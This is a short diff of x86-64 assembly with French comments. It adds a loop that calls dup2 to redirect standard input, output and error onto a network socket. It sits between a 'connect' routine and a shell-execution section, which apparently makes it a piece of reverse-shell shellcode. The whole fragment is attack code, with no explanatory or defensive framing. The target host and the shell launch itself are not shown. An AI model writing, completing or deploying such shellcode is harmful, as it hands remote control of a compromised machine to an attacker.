@@ -67,6 +67,14 @@ connect:
 ; Redirection des entrées/sorties 
 ; ----------------------------------
 redir_io:
+    mov rsi, 0        ; stdin
+    redir_loop:
+        mov rax, 33    ; dup2 (redirection socket reseau)
+        mov rdi, rbx   ; descripteur de socket
+        syscall
+        inc rsi        ; next: 1 (stdout), 2 (stderr)
+        cmp rsi, 3
+        jl redir_loop
 
 ; ----------------------------------
 ; Exécution du shell 
